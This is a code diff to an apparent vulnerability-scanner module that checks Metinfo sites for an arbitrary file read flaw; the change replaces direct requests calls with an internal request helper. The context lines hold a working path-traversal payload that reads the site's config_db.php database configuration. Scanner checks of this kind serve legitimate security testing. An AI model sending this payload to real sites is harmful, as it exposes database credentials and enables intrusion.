@@ -5,9 +5,8 @@ name: Metinfo任意文件读取漏洞
 description: Metinfo任意文件读取漏洞
 '''
 
-import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from app.lib.utils.request import request
+
 
 class Metinfo_Anyfile_Read_BaseVerify:
     def __init__(self, url):
@@ -21,7 +20,7 @@ class Metinfo_Anyfile_Read_BaseVerify:
             self.url = "http://" + self.url
         try:
             check_url = self.url + '/member/index.php?a=doshow&m=include&c=old_thumb&dir=http/./.../..././/./.../..././/config/config_db.php'
-            req = requests.get(check_url, headers = self.headers, allow_redirects = False, verify=False)
+            req = request.get(check_url, headers = self.headers)
             if "con_db_id" in req.text  and req.status_code==200:
                 print('存在Metinfo任意文件读取漏洞')
                 return True
